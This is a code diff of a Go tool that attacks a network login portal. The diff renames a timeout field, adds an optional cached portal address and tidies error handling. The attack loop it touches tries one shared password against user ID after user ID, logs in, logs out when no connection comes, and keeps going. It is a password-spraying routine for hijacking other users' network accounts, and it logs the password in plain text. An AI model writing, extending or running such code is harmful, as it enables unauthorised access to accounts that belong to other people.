@@ -10,9 +10,10 @@ import (
 
 type AttackConfig struct {
 	Host     string
+	Base     string
 	Link     string
 	Password string
-	Wait     time.Duration
+	Timeout  time.Duration
 }
 
 var attackLogger = log.New("auth/attack")
@@ -24,9 +25,12 @@ func Attack(cfg *AttackConfig) error {
 	}
 	attackLogger.Info("no connection, start attack", "host", cfg.Host, "password", cfg.Password)
 
-	base, err := FindPortal(cfg.Host, cfg.Link)
-	if err != nil {
-		return fmt.Errorf("failed to find portal: %w", err)
+	if cfg.Base == "" {
+		base, err := FindPortal(cfg.Host, cfg.Link)
+		if err != nil {
+			return fmt.Errorf("failed to find portal: %w", err)
+		}
+		cfg.Base = base
 	}
 
 	for {
@@ -42,13 +46,12 @@ func Attack(cfg *AttackConfig) error {
 				tried[userid] = struct{}{}
 			}
 
-			err := Login(&LoginConfig{
-				Base:     base,
+			if err := Login(&LoginConfig{
+				Base:     cfg.Base,
 				Link:     cfg.Link,
 				UserID:   userid,
 				Password: cfg.Password,
-			})
-			if err != nil {
+			}); err != nil {
 				attackLogger.Warn("failed to login", "error", err)
 				continue
 			}
@@ -56,7 +59,7 @@ func Attack(cfg *AttackConfig) error {
 			break
 		}
 
-		ctx, cancel := context.WithTimeout(context.Background(), cfg.Wait)
+		ctx, cancel := context.WithTimeout(context.Background(), cfg.Timeout)
 
 		go func() {
 			for {
@@ -74,7 +77,7 @@ func Attack(cfg *AttackConfig) error {
 		case context.DeadlineExceeded:
 			attackLogger.Info("no connection after login, keep attacking", "userid", userid)
 			if err := Logout(&LogoutConfig{
-				Base:   base,
+				Base:   cfg.Base,
 				Link:   cfg.Link,
 				UserID: userid,
 			}); err != nil {
